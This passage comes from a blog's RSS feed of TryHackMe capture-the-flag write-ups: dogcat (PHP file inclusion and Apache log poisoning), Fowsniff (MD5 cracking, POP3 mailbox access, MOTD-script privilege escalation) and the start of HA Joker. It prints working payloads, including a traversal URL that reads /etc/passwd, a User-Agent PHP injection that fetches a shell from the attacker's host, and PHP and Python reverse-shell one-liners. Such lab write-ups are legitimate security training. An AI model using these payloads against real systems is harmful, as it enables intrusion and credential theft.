&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rTB0ycb.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;So now using that null byte, we get:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/U4LAy7k.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Nothing yet. So it&amp;rsquo;d now help to have a look at the index file itself.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;html&amp;gt;

&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;dogcat&amp;lt;/title&amp;gt;
    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;/style.css&amp;quot;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;dogcat&amp;lt;/h1&amp;gt;
    &amp;lt;i&amp;gt;a gallery of various dogs or cats&amp;lt;/i&amp;gt;

    &amp;lt;div&amp;gt;
        &amp;lt;h2&amp;gt;What would you like to see?&amp;lt;/h2&amp;gt;
        &amp;lt;a href=&amp;quot;/?view=dog&amp;quot;&amp;gt;&amp;lt;button id=&amp;quot;dog&amp;quot;&amp;gt;A dog&amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;a href=&amp;quot;/?view=cat&amp;quot;&amp;gt;&amp;lt;button id=&amp;quot;cat&amp;quot;&amp;gt;A cat&amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
        &amp;lt;?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET[&amp;quot;ext&amp;quot;]) ? $_GET[&amp;quot;ext&amp;quot;] : &#39;.php&#39;;
            if(isset($_GET[&#39;view&#39;])) {
                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
                    echo &#39;Here you go!&#39;;
                    include $_GET[&#39;view&#39;] . $ext;
                } else {
                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;
                }
            }
        ?&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This makes a lot of sense. We can see it always wants dog or cat included. It also has this parameter &lt;code&gt;ext&lt;/code&gt;, which we can set or unset. This means the url must look like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog../../../../../../etc/passwd&amp;amp;ext=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This gives us the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file!&lt;/p&gt;
&lt;p&gt;Looking at the contents, we do not find anything out of the blue. What to do next? Well time for a reverse shell. The question is, how do we setup one?&lt;/p&gt;
&lt;p&gt;The answer is using &lt;code&gt;Apache Log Poisoning&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.152.133/?view=dog/../../../../../var/log/apache2/access.log&amp;amp;ext=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The below is what we find in the logs&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1 - - [04/Mar/2021:02:58:39 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:02:59:15 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:02:59:57 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:00:36 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:01:16 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:01:56 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 537 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&amp;quot; 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] &amp;quot;GET /style.css HTTP/1.1&amp;quot; 200 698 &amp;quot;http://10.10.124.216/&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&amp;quot; 10.8.150.214 - - [04/Mar/2021:03:02:01 +0000] &amp;quot;GET /favicon.ico HTTP/1.1&amp;quot; 404 492 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&amp;quot; 10.8.150.214 - - [04/Mar/2021:03:02:14 +0000] &amp;quot;GET /?view=dog/../../../../../var/log/apache2/access.log&amp;amp;ext= HTTP/1.1&amp;quot; 200 775 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:02:32 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:03:08 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:03:43 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:04:19 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:04:55 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot; 127.0.0.1 - - [04/Mar/2021:03:05:26 +0000] &amp;quot;GET / HTTP/1.1&amp;quot; 200 615 &amp;quot;-&amp;quot; &amp;quot;curl/7.64.0&amp;quot;  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The below is what kind of user-requests looks like (I opened up burpsuite)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /?view=dog/../../../../../var/log/apache2/access.log&amp;amp;ext= HTTP/1.1
Host: 10.10.124.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lets put the ability to put commands as: `&lt;!-- raw HTML omitted --&gt;:&lt;/p&gt;
&lt;p&gt;Thus, using it as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /?view=dog&amp;amp;c=php%20-r%20&#39;$sock=fsockopen(%2210.8.150.214%22,4444);exec(%22/bin/sh%20-i%20%3C&amp;amp;3%20%3E&amp;amp;3%202%3E&amp;amp;3%22); HTTP/1.1
Host: 10.10.124.216
User-Agent: %3C?php%20system((isset($_GET%5B&#39;c&#39;%5D))?$_GET%5B&#39;c&#39;%5D:&#39;echo&#39;);%20?%3E%0A
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It does not work. So, I am going to try another route: upload the reverse shell php file (already present in kali systems) to the server using &lt;code&gt;curl&lt;/code&gt; and the &lt;code&gt;-A&lt;/code&gt; flag for setting the user agent. But thats not all, we need to have the file served, so that the curl command curls from our temporary server. I am going to use python3 simple http server for this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sudo python3 -m http.server 4242
Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The curl did not work for some reason, so I fired up burp again, and this is what I put:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /?view=dog../../../../../var/log/apache2/access.log&amp;amp;ext= HTTP/1.1
Host: 10.10.8.231
User-Agent: &amp;lt;?php file_put_contents(&#39;phpreverseshell.php&#39;,file_get_contents(&#39;http://10.8.150.214:4242/phpreverseshell.php&#39;))?&amp;gt;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I see get requests, so the payload was successful!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sudo python3 -m http.server 4242
Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
10.10.8.231 - - [03/Mar/2021 23:55:53] &amp;quot;GET /phpreverseshell.php HTTP/1.0&amp;quot; 200 -
10.10.8.231 - - [03/Mar/2021 23:56:21] &amp;quot;GET /phpreverseshell.php HTTP/1.0&amp;quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, lets go to: &lt;code&gt;http://10.10.8.231/phpreverseshell.php&lt;/code&gt;. And don&amp;rsquo;t forget to setup &lt;code&gt;nc&lt;/code&gt; as well :P&lt;/p&gt;
&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ pwd
/
$ whoami
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat flag2_QMW7JvaY2LvK.txt
THM{leet}
$ pwd
/var/www
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;$ cat flag.php
&amp;lt;?php
$flag_1 = &amp;quot;THM{l33t}&amp;quot;
?&amp;gt;
$ pwd
/var/www/html
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the sudo permissions, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo -l
Matching Defaults entries for www-data on f7c1f89308d0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on f7c1f89308d0:
    (root) NOPASSWD: /usr/bin/env
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interestingly, the machine name looks like a docker container. As for the permissions, &lt;code&gt;gtfobins&lt;/code&gt; ftw. Anyways, after successful priv esc, we can get the third flag.&lt;/p&gt;
&lt;p&gt;Looking around, we see an interesting file in &lt;code&gt;/opt/backup&lt;/code&gt;, which looks like our way out.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s setup &lt;code&gt;nc&lt;/code&gt; for a second time now, at another port&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.8.231] 40614
bash: cannot set terminal process group (3450): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt                                                   
THM{PWNED} 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Fowsniff CTF Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-fowsniff-ctf-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-fowsniff-ctf-writeup/</guid>
        <description>&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg" alt="Featured image of post TryHackMe: Fowsniff CTF Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/ctf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES TOP USER SASL(PLAIN) AUTH-RESP-CODE UIDL CAPA PIPELINING
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 Pre-login LITERAL+ LOGIN-REFERRALS more have SASL-IR OK capabilities listed IDLE IMAP4rev1 ENABLE post-login ID
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH open&lt;/li&gt;
&lt;li&gt;port 80 serving http, we&amp;rsquo;ll explore it below&lt;/li&gt;
&lt;li&gt;POP3 port open, which means we are going to dig into employee e-mails XD&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt,zip&#39; -t 64 -q -u 10.10.115.96
/images               (Status: 301) [Size: 313] [--&amp;gt; http://10.10.115.96/images/]
/index.html           (Status: 200) [Size: 2629]                                 
/security.txt         (Status: 200) [Size: 459]                                  
/assets               (Status: 301) [Size: 313] [--&amp;gt; http://10.10.115.96/assets/]
/README.txt           (Status: 200) [Size: 1288]                                 
/robots.txt           (Status: 200) [Size: 26]                                   
/LICENSE.txt          (Status: 200) [Size: 17128]                                
/server-status        (Status: 403) [Size: 300]                
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;security.txt&lt;/code&gt; looks interesting&lt;/li&gt;
&lt;li&gt;&lt;code&gt;robots.txt&lt;/code&gt; is usually very helpful&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/assets/&lt;/code&gt; could contain shady javascript files&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/kibWSYW.jpg&#34; alt=&#34;Fowsniff CTF Corp&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;They mention some kind of breach, and something related to their official twitter account.&lt;/p&gt;
&lt;p&gt;Looking at the source code, we find a script commented out.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;!--[if lte IE 8]&amp;gt;&amp;lt;script src=&amp;quot;assets/js/ie/respond.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;![endif]--&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This may hint at something, and we may want to look at it later on.&lt;/p&gt;
&lt;p&gt;For now, let&amp;rsquo;s see the &lt;code&gt;.txt&lt;/code&gt; files. We see,
&lt;img src=&#34;https://i.imgur.com/4wHmBbA.png&#34; alt=&#34;fowsniff corp pw3nd by B1gN1nj4&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;amazing XD&lt;/p&gt;
&lt;h3 id=&#34;14-exploring-pop3-service&#34;&gt;1.4. Exploring POP3 Service&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ telnet 10.10.115.96 110
Trying 10.10.115.96...
Connected to 10.10.115.96.
Escape character is &#39;^]&#39;.
+OK Welcome to the Fowsniff Corporate Mail Server!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We use telnet and specify the port. We see that it is a corporate mail server. Note the website mentions breach of employee usernames and passwords, so maybe we can try to login here.&lt;/p&gt;
&lt;h3 id=&#34;15-internet-exploration-googling&#34;&gt;1.5. Internet Exploration: Googling&lt;/h3&gt;
&lt;p&gt;Doing some Googling, we find:
&lt;img src=&#34;https://i.imgur.com/doAgpUu.jpg&#34; alt=&#34;twitter page of fowsniff corp hacked&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The first tweet mentiones a link to a pastebin,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FOWSNIFF CORP PASSWORD LEAK
            &#39;&#39;~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:{hidden}
mustikka@fowsniff:{hidden}
tegel@fowsniff:{hidden}
baksteen@fowsniff:{hidden}
seina@fowsniff:{hidden}
stone@fowsniff:{hidden}
mursten@fowsniff:{hidden}
parede@fowsniff:{hidden}
sciana@fowsniff:{hidden}
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn&#39;t have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we get some interesting information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;POP3 open (as we already explored)&lt;/li&gt;
&lt;li&gt;The hashes are MD5&lt;/li&gt;
&lt;li&gt;Since these are email passwords, we can login to POP3 :D&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;16-hash-cracking-jtr&#34;&gt;1.6. Hash Cracking: JtR&lt;/h3&gt;
&lt;p&gt;I pasted the username password combinations in a &lt;code&gt;data&lt;/code&gt; file on my machine, and used the tool: John the Ripper to crack the MD5 hashes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ john data --format=&amp;quot;Raw-MD5&amp;quot; --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{hidden}    (seina@fowsniff)
{hidden}    (parede@fowsniff)
{hidden}    (tegel@fowsniff)
{hidden}    (baksteen@fowsniff)
{hidden}    (mauer@fowsniff)
{hidden}    (sciana@fowsniff)
{hidden}    (mursten@fowsniff)
{hidden}    (mustikka@fowsniff)
8g 0:00:00:03 DONE (2021-06-07 22:08) 2.631g/s 4718Kp/s 4718Kc/s 12066KC/s  fuckyooh21..*7¡Vamos!
Use the &amp;quot;--show --format=Raw-MD5&amp;quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;17-exploiting-pop3-service&#34;&gt;1.7. Exploiting POP3 Service&lt;/h3&gt;
&lt;p&gt;Using some help from &lt;a class=&#34;link&#34; href=&#34;https://www.shellhacks.com/retrieve-email-pop3-server-command-line/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this website&lt;/a&gt; we get the commands. Feel free to explore more.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ telnet 10.10.115.96 110
Trying 10.10.115.96...
Connected to 10.10.115.96.
Escape character is &#39;^]&#39;.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS {hidden}
+OK Logged in.
STAT
+OK 2 2902
RETR 1
+OK 1622 octets
Return-Path: &amp;lt;stone@fowsniff&amp;gt;
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: &amp;lt;20180313185107.0FA3916A@fowsniff&amp;gt;
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are &amp;quot;in the shop,&amp;quot; we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is &amp;quot;{hidden}&amp;quot;

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we&#39;ll set it up.

Thanks,
A.J Stone


.
RETR 2
+OK 1280 octets
Return-Path: &amp;lt;baksteen@fowsniff&amp;gt;
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: &amp;lt;20180313185405.101CA1AC2@fowsniff&amp;gt;
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don&#39;t know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I&#39;m coming down with it myself.
How long have you been gone - a week?
Next time you&#39;re going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I&#39;m going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it&#39;s probably just some
&amp;quot;Let me explain the tone of my meeting with management&amp;quot; face-saving mail.
I&#39;ll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PS: if you have trouble logging out of this weird thing, read the help message on the top :D&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;From the first email, we get: &lt;code&gt;The temporary password for SSH is &amp;quot;{hidden}&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can now login using SSH :)&lt;/p&gt;
&lt;p&gt;Using the credentials we got - both the username and password,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh {hidden-username}@10.10.115.96 
{hidden-username}@10.10.115.96&#39;s password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &#39;_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| &#39;__| &#39;_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
{hidden-username}@fowsniff:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;The room hints us to look at the files owned by the group. Using &lt;code&gt;find / -type f -group users&lt;/code&gt;, we get a file on the top named: &lt;code&gt; /opt/cube/cube.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Exploring more, we get the following file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{hidden-username}@fowsniff:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#    {truncated}
#

#printf &amp;quot;Welcome to %s (%s %s %s)\n&amp;quot; &amp;quot;$DISTRIB_DESCRIPTION&amp;quot; &amp;quot;$(uname -o)&amp;quot; &amp;quot;$(uname -r)&amp;quot; &amp;quot;$(uname -m)&amp;quot;

sh /opt/cube/cube.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that as soon as you connect to ssh, the &lt;code&gt;update-motd.d&lt;/code&gt; file is run, and the banner, stored in &lt;code&gt;/opt/cube/cube.sh&lt;/code&gt; is shown to you.&lt;/p&gt;
&lt;p&gt;Since we found this &lt;em&gt;because&lt;/em&gt; we are in this group, we can edit this. This means we can now put in a reverse shell. From &lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Reverse Shell Generator&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;export RHOST=&amp;quot;{MY_IP}&amp;quot;;export RPORT=1337;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&amp;quot;RHOST&amp;quot;),int(os.getenv(&amp;quot;RPORT&amp;quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;quot;sh&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And &amp;hellip;
&lt;img src=&#34;https://i.imgur.com/KXBPVdy.png&#34; alt=&#34;getting root on fowsniff ctf exploiting motd.d&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;System compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: HA Joker CTF Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-ha-joker-ctf-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-ha-joker-ctf-writeup/</guid>
        <description>&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg" alt="Featured image of post TryHackMe: HA Joker CTF Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/jokerctf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
